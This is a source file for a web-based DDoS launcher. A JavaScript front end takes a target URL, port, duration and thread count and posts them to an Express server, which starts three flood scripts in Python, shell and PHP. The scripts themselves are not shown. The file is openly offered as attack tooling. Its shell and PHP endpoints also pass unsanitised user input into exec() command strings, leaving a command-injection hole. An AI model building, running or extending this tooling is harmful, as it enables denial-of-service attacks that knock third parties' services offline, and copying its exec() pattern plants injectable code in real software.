// Frontend JavaScript
function launchCombinedAttack() {
    const target = document.getElementById('targetUrl').value;
    const port = document.getElementById('port').value;
    const duration = document.getElementById('duration').value;
    const threads = document.getElementById('threads').value;
    const statusDiv = document.getElementById('status');
    const progressDiv = document.getElementById('attackProgress');

    if (!target) {
        statusDiv.innerHTML = 'Status: ERROR - Target URL required';
        return;
    }

    statusDiv.innerHTML = 'Status: LAUNCHING COMBINED ATTACK...';
    progressDiv.innerHTML = 'Initializing all attack vectors...';

    // Python Backend Attack
    fetch('/python-attack', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, port, duration, threads })
    })
    .then(r => r.text())
    .then(data => {
        progressDiv.innerHTML += ' | Python: ACTIVE';
    })
    .catch(err => {
        progressDiv.innerHTML += ' | Python: FAILED';
    });

    // Shell Script Attack
    fetch('/shell-attack', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ target, duration, threads })
    })
    .then(r => r.text())
    .then(data => {
        progressDiv.innerHTML += ' | Shell: ACTIVE';
    })
    .catch(err => {
        progressDiv.innerHTML += ' | Shell: FAILED';
    });

    // PHP Backend Attack
    fetch('/php-attack', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `target=${encodeURIComponent(target)}&duration=${duration}&threads=${threads}`
    })
    .then(r => r.text())
    .then(data => {
        progressDiv.innerHTML += ' | PHP: ACTIVE';
        statusDiv.innerHTML = 'Status: ALL ATTACKS LAUNCHED';
    })
    .catch(err => {
        progressDiv.innerHTML += ' | PHP: FAILED';
    });
}

// Backend Server (Node.js/Express)
const express = require('express');
const { exec, spawn } = require('child_process');
const path = require('path');
const bodyParser = require('body-parser');

const app = express();

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Python Attack Endpoint
app.post('/python-attack', (req, res) => {
    const { target, port, duration, threads } = req.body;
    
    const pythonProcess = spawn('python3', [
        path.join(__dirname, 'tools_ddos.py'),
        target, port, duration, threads
    ]);

    pythonProcess.stdout.on('data', (data) => {
        console.log(`Python: ${data}`);
    });

    res.send('Python attack initiated');
});

// Shell Attack Endpoint  
app.post('/shell-attack', (req, res) => {
    const { target, duration, threads } = req.body;
    
    exec(`chmod +x ${path.join(__dirname, 'tools_ddos2.sh')} && ${path.join(__dirname, 'tools_ddos2.sh')} "${target}" ${duration} ${threads}`,
        (error, stdout, stderr) => {
            console.log(`Shell: ${stdout || stderr}`);
        });

    res.send('Shell attack initiated');
});

// PHP Attack Endpoint
app.post('/php-attack', (req, res) => {
    const { target, duration, threads } = req.body;
    
    exec(`php ${path.join(__dirname, 'tools_ddos3.php')} "${target}" ${duration} ${threads}`,
        (error, stdout, stderr) => {
            console.log(`PHP: ${stdout || stderr}`);
        });

    res.send('PHP attack initiated');
});

app.listen(3000, '0.0.0.0', () => {
    console.log('DDoS server running on port 3000');
});